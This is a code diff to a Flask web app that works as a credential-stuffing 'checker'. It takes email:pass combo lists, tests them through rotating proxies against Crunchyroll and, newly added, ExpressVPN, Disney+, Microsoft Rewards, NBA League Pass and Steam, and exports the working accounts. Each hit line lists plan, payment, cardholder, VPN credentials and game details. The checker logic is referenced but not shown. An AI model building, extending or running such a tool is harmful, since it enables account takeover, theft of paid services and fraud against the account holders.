@@ -14,7 +14,7 @@ app = Flask(__name__)
 tasks = {}
 task_lock = threading.Lock()
 
-HTML_TEMPLATE = r"""
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -26,10 +26,11 @@ HTML_TEMPLATE = r"""
         * { box-sizing: border-box; }
         body {
             background: #111; color: #eee; font-family: 'Space Mono', monospace;
-            margin: 0; padding: 20px; min-height: 100vh;
+            margin: 0; padding: 20px; min-height: 100vh; perspective: 1000px;
         }
         .container { 
             max-width: 1100px; margin: 0 auto; width: 100%;
+            transition: transform 0.1s ease-out; transform-style: preserve-3d;
         }
         .site-header {
             display: flex; justify-content: space-between; align-items: center;
@@ -68,13 +69,9 @@ HTML_TEMPLATE = r"""
             background-image: url('data:image/svg+xml;utf8,<svg fill="%2300ffaa" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
             background-repeat: no-repeat; background-position: right 15px top 50%;
         }
-        .service-select:focus {
-            outline: 3px solid #00ffaa; outline-offset: 2px;
-        }
         .service-desc {
-            color: #aaa; font-size: 14px; margin-bottom: 20px; padding: 15px;
-            background: #1a1a1a; border-left: 4px solid #ff5500;
-            font-style: italic;
+            color: #888; font-size: 13px; margin-bottom: 20px; padding: 10px;
+            background: #1a1a1a; border-left: 3px solid #ff5500;
         }
         .panels { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .panel {
@@ -82,88 +79,39 @@ HTML_TEMPLATE = r"""
             box-shadow: 10px 10px 0px #000; padding: 15px;
         }
         .panel h3 {
-            margin-top: 0; border-bottom: 2px solid #555; padding-bottom: 10px;
-            text-transform: uppercase; color: #00ffaa; font-size: 16px;
+            margin-top: 0; border-bottom: 2px solid #555; padding-bottom: 5px;
+            text-transform: uppercase; color: #00ffaa;
         }
         textarea {
             width: 100%; height: 150px; background: #000; color: #00ffaa;
             border: 2px solid #555; padding: 10px; font-family: 'Space Mono', monospace;
-            box-shadow: inset 4px 4px 0px #111; resize: vertical; font-size: 14px;
-        }
-        textarea:focus {
-            outline: 2px solid #00ffaa; outline-offset: -2px;
-        }
-        textarea::placeholder {
-            color: #555;
-        }
-        .file-input-wrapper {
-            margin-top: 15px; padding: 12px; background: #1a1a1a;
-            border: 2px dashed #444; text-align: center;
-            transition: border-color 0.2s, background 0.2s;
-        }
-        .file-input-wrapper:hover {
-            border-color: #00ffaa; background: #222;
+            box-shadow: inset 4px 4px 0px #111; resize: vertical;
         }
         input[type="file"] {
-            color: #ccc; font-family: 'Space Mono', monospace; width: 100%;
-            cursor: pointer;
-        }
-        input[type="file"]::-webkit-file-upload-button {
-            background: #333; color: #00ffaa; border: 2px solid #00ffaa;
-            padding: 8px 15px; margin-right: 10px; cursor: pointer;
-            font-family: 'Space Mono', monospace; font-weight: bold;
-            box-shadow: 3px 3px 0px #000;
-            transition: transform 0.1s, box-shadow 0.1s;
-        }
-        input[type="file"]::-webkit-file-upload-button:hover {
-            transform: translate(1px, 1px); box-shadow: 2px 2px 0px #000;
+            margin-top: 10px; color: #ccc; display: block;
+            font-family: 'Space Mono', monospace; width: 100%;
         }
         .btn {
             background: #ff5500; color: #000; border: 3px solid #000; padding: 15px 30px;
             font-size: 18px; font-weight: bold; text-transform: uppercase; cursor: pointer;
-            box-shadow: 8px 8px 0px #000; transition: transform 0.1s, box-shadow 0.1s, background 0.2s;
+            box-shadow: 8px 8px 0px #000; transition: transform 0.1s, box-shadow 0.1s;
             font-family: 'Space Mono', monospace; width: 100%; margin-top: 20px;
-            position: relative; overflow: hidden;
         }
-        .btn:hover:not(:disabled) { transform: translate(2px, 2px); box-shadow: 6px 6px 0px #000; }
-        .btn:active:not(:disabled) { transform: translate(8px, 8px); box-shadow: 0px 0px 0px #000; }
+        .btn:hover { transform: translate(2px, 2px); box-shadow: 6px 6px 0px #000; }
+        .btn:active { transform: translate(8px, 8px); box-shadow: 0px 0px 0px #000; }
         .btn:disabled {
-            background: #333; color: #555; cursor: not-allowed;
-            box-shadow: 4px 4px 0px #000; transform: none; border-color: #222;
+            background: #555; color: #888; cursor: not-allowed;
+            box-shadow: 8px 8px 0px #000; transform: none;
         }
         #logArea {
             background: #000; border: 3px solid #444; box-shadow: 10px 10px 0px #000;
             height: 300px; overflow-y: scroll; padding: 15px; font-size: 13px;
             color: #00ffaa; white-space: pre-wrap; margin-top: 20px;
             font-family: 'Space Mono', monospace; word-break: break-all;
-            line-height: 1.5;
-        }
-        #logArea:empty::before {
-            content: '[System] Awaiting input...';
-            color: #555;
         }
         #downloadBtn { display: none; background: #00ffaa; color: #000; }
-        #downloadBtn:hover:not(:disabled) { 
-            transform: translate(2px, 2px); 
-            box-shadow: 6px 6px 0px #000; 
-        }
-        .status-indicator {
-            display: inline-block; width: 10px; height: 10px;
-            border-radius: 50%; margin-right: 8px;
-            background: #555;
-        }
-        .status-indicator.active { background: #ff5500; animation: pulse 1s infinite; }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .counter-badge {
-            background: #333; color: #00ffaa; padding: 5px 10px;
-            border: 2px solid #00ffaa; font-size: 12px;
-            box-shadow: 3px 3px 0px #000; margin-left: 10px;
-        }
         @media (max-width: 600px) {
-            body { padding: 10px; }
+            body { padding: 10px; perspective: none; }
             .site-header { flex-direction: column; align-items: flex-start; gap: 15px; }
             .header-right { width: 100%; align-items: flex-start; flex-direction: row; justify-content: space-between; }
             h1 { font-size: 22px; }
@@ -171,7 +119,7 @@ HTML_TEMPLATE = r"""
             .btn { font-size: 16px; padding: 12px 20px; }
             .panel { box-shadow: 6px 6px 0px #000; }
             #logArea { box-shadow: 6px 6px 0px #000; height: 250px; font-size: 12px; }
-            .service-select { font-size: 14px; padding: 12px; }
+            .container { transform: none !important; }
         }
     </style>
 </head>
@@ -189,28 +137,36 @@ HTML_TEMPLATE = r"""
         </header>
         
         <select id="service" class="service-select" onchange="updateDesc()">
+            <option value="expressvpn">🌐 ExpressVPN</option>
             <option value="crunchyroll" selected>🍿 Crunchyroll</option>
+            <option value="disney">🏰 Disney+</option>
+            <option value="microsoft">🎮 Microsoft Rewards</option>
+            <option value="nba">🏀 NBA League Pass</option>
+            <option value="steam">🎮 Steam</option>
         </select>
         <div class="service-desc" id="serviceDesc">Checks Crunchyroll accounts using email:pass combos.</div>
 
         <div class="panels">
             <div class="panel">
-                <h3><span class="status-indicator" id="statusIndicator"></span>Accounts (email:pass)</h3>
-                <textarea id="accounts_text" placeholder="Enter email:pass combinations (one per line, max 50)"></textarea>
-                <div class="file-input-wrapper">
-                    <input type="file" id="accounts_file" accept=".txt,text/plain" onchange="loadFile(this)">
-                </div>
+                <h3>Accounts (email:pass)</h3>
+                <textarea id="accounts_text" placeholder="email:pass (max 50)"></textarea>
+                <input type="file" id="accounts_file" accept=".txt" onchange="loadFile(this, 'accounts_text')">
             </div>
         </div>
         
         <button class="btn" id="startBtn" disabled onclick="startChecking()">START CHECKING</button>
-        <div id="logArea"></div>
+        <div id="logArea">[System] Awaiting input...</div>
         <button class="btn" id="downloadBtn">DOWNLOAD RESULTS</button>
     </div>
 
     <script>
         const descMap = {
-            'crunchyroll': 'Checks Crunchyroll accounts using email:pass combos. Returns plan, streams, country, expiry.'
+            'expressvpn': 'Checks ExpressVPN accounts using email:pass combos. Returns plan, expiry, OVPN/PPTP creds.',
+            'crunchyroll': 'Checks Crunchyroll accounts using email:pass combos. Returns plan, streams, country, expiry.',
+            'disney': 'Checks Disney+ accounts using email:pass combos. Returns plan, status, profiles, Hulu status.',
+            'microsoft': 'Checks Microsoft Rewards accounts using email:pass. Returns balance, subscriptions, points.',
+            'nba': 'Checks NBA League Pass accounts using email:pass. Returns display name, expiry, country.',
+            'steam': 'Checks Steam accounts using email:pass. Returns games, level, VAC bans, notable titles.'
         };
 
         function updateDesc() {
@@ -218,107 +174,26 @@ HTML_TEMPLATE = r"""
             document.getElementById('serviceDesc').textContent = descMap[svc] || '';
         }
 
-        let hasContent = false;
+        let accountsLoaded = false;
 
-        // Smart cleaner: extracts email:pass from each line, removing garbage text
-        function cleanLine(line) {
-            line = line.trim();
-            if (!line.includes(':')) return '';
-            
-            // Split on first colon to get email and the rest
-            const firstColonIndex = line.indexOf(':');
-            const email = line.substring(0, firstColonIndex).trim();
-            const rest = line.substring(firstColonIndex + 1);
-            
-            // Password is everything up to the first space or end of line
-            // This handles cases like "email:pass habibi <garbage>"
-            const passMatch = rest.match(/^(\S+)/);
-            if (!passMatch) return '';
-            
-            const password = passMatch[1].trim();
-            
-            if (email && password) {
-                return email + ':' + password;
-            }
-            return '';
-        }
-
-        function cleanAllLines(text) {
-            const lines = text.split(/\r?\n/);
-            const cleanedLines = [];
-            for (const line of lines) {
-                const cleaned = cleanLine(line);
-                if (cleaned) {
-                    cleanedLines.push(cleaned);
-                }
-            }
-            return cleanedLines.join('\n');
-        }
-
-        function loadFile(input) {
+        function loadFile(input, textareaId) {
             const file = input.files[0];
             if (!file) return;
             const reader = new FileReader();
             reader.onload = function(e) {
-                const textarea = document.getElementById('accounts_text');
-                const currentContent = textarea.value.trim();
-                let fileContent = e.target.result;
-                
-                console.log('File loaded, raw length:', fileContent.length);
-                console.log('First 200 chars:', fileContent.substring(0, 200));
-                
-                // Try to detect and handle different encodings
-                // First, clean the file content
-                let cleanedFileContent = cleanAllLines(fileContent);
-                
-                console.log('Cleaned length:', cleanedFileContent.length);
-                
-                // If cleaning removed everything, try showing raw content for debugging
-                if (!cleanedFileContent.trim()) {
-                    // File might not have valid email:pass format, show as-is
-                    fileContent = fileContent.trim();
-                    if (currentContent && fileContent) {
-                        textarea.value = currentContent + '\n' + fileContent;
-                    } else if (fileContent) {
-                        textarea.value = fileContent;
-                    }
-                } else {
-                    // Normal case: cleaned content is valid
-                    if (currentContent && cleanedFileContent) {
-                        textarea.value = currentContent + '\n' + cleanedFileContent;
-                    } else if (cleanedFileContent) {
-                        textarea.value = cleanedFileContent;
-                    }
-                }
+                const textarea = document.getElementById(textareaId);
+                textarea.value = textarea.value ? textarea.value + '\\n' + e.target.result : e.target.result;
                 updateStartButton();
-                input.value = '';
             };
-            reader.onerror = function(e) {
-                alert('Error reading file: ' + file.name);
-                console.error('FileReader error:', e);
-                input.value = '';
-            };
-            reader.readAsText(file, 'UTF-8');
+            reader.readAsText(file);
         }
 
         function updateStartButton() {
-            const textarea = document.getElementById('accounts_text');
-            const lines = textarea.value.trim().split('\n').filter(line => line.trim().length > 0);
-            const validLines = lines.filter(line => line.includes(':') && line.split(':').length >= 2);
-            hasContent = validLines.length > 0;
-            document.getElementById('startBtn').disabled = !hasContent;
+            accountsLoaded = document.getElementById('accounts_text').value.trim().length > 0;
+            document.getElementById('startBtn').disabled = !accountsLoaded;
         }
 
         document.getElementById('accounts_text').addEventListener('input', updateStartButton);
-        
-        // Also clean on paste event
-        document.getElementById('accounts_text').addEventListener('paste', function(e) {
-            setTimeout(function() {
-                const textarea = document.getElementById('accounts_text');
-                textarea.value = cleanAllLines(textarea.value);
-                updateStartButton();
-            }, 10);
-        });
 
         async function processStream(url, payload, onMessage) {
             const response = await fetch(url, {
@@ -333,7 +208,7 @@ HTML_TEMPLATE = r"""
                 const {done, value} = await reader.read();
                 if(done) break;
                 buffer += decoder.decode(value, {stream: true});
-                const lines = buffer.split('\n');
+                const lines = buffer.split('\\n');
                 buffer = lines.pop();
                 for(const line of lines) {
                     if(line.startsWith('data: ')) {
@@ -351,13 +226,11 @@ HTML_TEMPLATE = r"""
             document.getElementById('startBtn').textContent = 'PROCESSING...';
             document.getElementById('service').disabled = true;
             document.getElementById('logArea').innerHTML = '';
-            document.getElementById('statusIndicator').classList.add('active');
             
             await processStream('/check', {service: service, accounts: fullAccounts}, (data) => {
                 if (data.log) {
-                    const logArea = document.getElementById('logArea');
-                    logArea.innerHTML += data.log + '\n';
-                    logArea.scrollTop = logArea.scrollHeight;
+                    document.getElementById('logArea').innerHTML += data.log + '\\n';
+                    document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
                 } else if (data.event === 'done') {
                     document.getElementById('downloadBtn').style.display = 'block';
                     document.getElementById('downloadBtn').onclick = () => {
@@ -366,8 +239,21 @@ HTML_TEMPLATE = r"""
                     document.getElementById('startBtn').textContent = 'START CHECKING';
                     document.getElementById('startBtn').disabled = false;
                     document.getElementById('service').disabled = false;
-                    document.getElementById('statusIndicator').classList.remove('active');
                 }
+            });
+        }
+
+        const container = document.getElementById('mainContainer');
+        if (window.innerWidth > 600) {
+            document.addEventListener('mousemove', (e) => {
+                const x = (window.innerWidth / 2 - e.pageX) / 80;
+                const y = (window.innerHeight / 2 - e.pageY) / 80;
+                const tiltX = Math.max(-5, Math.min(5, y));
+                const tiltY = Math.max(-5, Math.min(5, -x));
+                container.style.transform = `rotateX(${tiltX}deg) rotateY(${tiltY}deg)`;
+            });
+            document.addEventListener('mouseleave', () => {
+                container.style.transform = 'rotateX(0) rotateY(0)';
             });
         }
     </script>
@@ -417,10 +303,15 @@ def check():
             logs.append(f"[{ts}] {msg}")
 
     checker_map = {
-        'crunchyroll': checker.CrunchyrollChecker
+        'expressvpn': checker.ExpressVPNChecker,
+        'crunchyroll': checker.CrunchyrollChecker,
+        'disney': checker.DisneyChecker,
+        'microsoft': checker.MicrosoftRewardsChecker,
+        'nba': checker.NBAChecker,
+        'steam': checker.SteamChecker
     }
     
-    CheckerClass = checker.CrunchyrollChecker
+    CheckerClass = checker_map.get(service, checker.CrunchyrollChecker)
 
     def check_entry(email, password, proxy_manager):
         max_attempts = 3
@@ -486,11 +377,11 @@ def check():
         proxy_manager = checker.SmartProxyManager(working_proxies)
 
         with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = [executor.submit(check_entry, email, password, proxy_manager) for email, password in entries_to_check]
+            futures = {executor.submit(check_entry, e, p, proxy_manager): (e, p) for e, p in entries_to_check}
             for future in as_completed(futures):
                 res = future.result()
                 with results_lock:
-                    results.append(res)
+                    results.append((futures[future], res))
         
         with task_lock:
             tasks[task_id] = (service, results)
@@ -530,8 +421,21 @@ def download(task_id):
         d = res.get('data', res)
         identifier = f"{entry[0]}:{entry[1]}"
 
-        if svc == 'crunchyroll':
+        if svc == 'expressvpn':
+            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expire_date', 'N/A')} ({d.get('days_left', 0)}d) | Auto: {d.get('auto_renew', 'N/A')} | Pay: {d.get('payment_method', 'N/A')} | Lic: {d.get('license', 'N/A')} | OVPN: {d.get('ovpn_user', '')}:{d.get('ovpn_pass', '')} | PPTP: {d.get('pptp_user', '')}:{d.get('pptp_pass', '')}"
+        elif svc == 'crunchyroll':
             return f"{identifier} | User: {d.get('user', 'N/A')} | Plan: {d.get('plan', 'N/A')} | Streams: {d.get('streams', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Renew: {d.get('renew', 'N/A')} | CC: {d.get('country', 'N/A')} | Pay: {d.get('payment', 'N/A')} | SKU: {d.get('sku', 'N/A')}"
+        elif svc == 'disney':
+            profiles = ', '.join(d.get('profiles', []))
+            return f"{identifier} | Plan: {d.get('plan', 'N/A')} | Status: {d.get('subscriber_status', 'N/A')} | CC: {d.get('country', 'N/A')} | Billing: {d.get('billing_cycle', 'N/A')} | Pay: {d.get('payment_provider', 'N/A')} | Expiry: {d.get('expiry', 'N/A')} ({d.get('remaining_days', 'N/A')}d) | Trial: {d.get('free_trial', 'N/A')} | Ver: {d.get('email_verified', 'N/A')} | Hulu: {d.get('hulu', 'N/A')} | Profiles: {profiles}"
+        elif svc == 'microsoft':
+            return f"{identifier} | CC: {d.get('country', 'N/A')} | Holder: {d.get('card_holder', 'N/A')} | Bal: {d.get('balance', 'N/A')} | Subs: {d.get('purchased_items', 'N/A')} | Auto: {d.get('auto_renew', 'N/A')} | Start: {d.get('start_date', 'N/A')} | Renew: {d.get('renewal_date', 'N/A')} | Pts: {d.get('points', 'N/A')}"
+        elif svc == 'nba':
+            return f"{identifier} | Name: {d.get('displayname', 'N/A')} | Expiry: {d.get('end_date', 'N/A')} | CC: {d.get('country', 'N/A')} | Renew: {d.get('renewal', 'N/A')}"
+        elif svc == 'steam':
+            notable = ', '.join([g['name'] for g in d.get('notable', [])])
+            top10 = ', '.join([f"{g['name']}({g['playtime']}m)" for g in d.get('games_list', [])[:10]])
+            return f"{identifier} | Persona: {d.get('persona', 'N/A')} | ID: {d.get('steamid', 'N/A')} | CC: {d.get('country', 'N/A')} | Lvl: {d.get('level', 'N/A')} | Games: {d.get('game_count', 'N/A')} | VAC: {d.get('vac_bans', 0)} | Trade: {d.get('trade_ban', 'N/A')} | Lim: {d.get('limited', 'N/A')} | Notable: {notable} | Top10: {top10}"
         return f"{identifier} | HIT"
 
     for entry, res in task_results:
@@ -539,7 +443,7 @@ def download(task_id):
         identifier = f"{entry[0]}:{entry[1]}"
         
         if status == 'HIT':
-            hits.append(format_hit_line(service, res))
+            hits.append(format_hit_line(service, entry, res))
         elif status == 'BAD':
             err = res.get('error') or res.get('reason') or 'Bad / Invalid / Free'
             bads.append(f"{identifier} | {err}")
